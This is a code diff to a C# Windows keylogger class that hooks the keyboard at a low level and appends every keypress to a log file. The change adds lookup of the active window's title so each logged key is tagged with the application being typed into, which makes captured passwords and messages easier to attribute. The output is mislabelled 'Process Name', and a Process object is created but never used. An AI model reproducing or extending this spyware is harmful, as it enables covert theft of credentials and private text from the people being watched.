@@ -2,9 +2,10 @@
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Windows.Forms;
 
-namespace HooksTutorial
+namespace Hooks
 {
     class KeyLogger
     {
@@ -34,6 +35,25 @@ namespace HooksTutorial
 
         private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
 
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+        private static string GetActiveWindowTitle()
+        {
+            const int nChars = 256;
+            StringBuilder Buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, Buff, nChars) > 0)
+            {
+                return Buff.ToString();
+            }
+            return null;
+        }
+
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
@@ -42,6 +62,9 @@ namespace HooksTutorial
                 Console.WriteLine((Keys)vkCode);
                 StreamWriter sw = new StreamWriter(log, true);
                 sw.Write((Keys)vkCode);
+                using (Process curProcess = Process.GetCurrentProcess())
+                sw.Write(" - Process Name: "+(GetActiveWindowTitle()));
+                sw.WriteLine();
                 sw.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
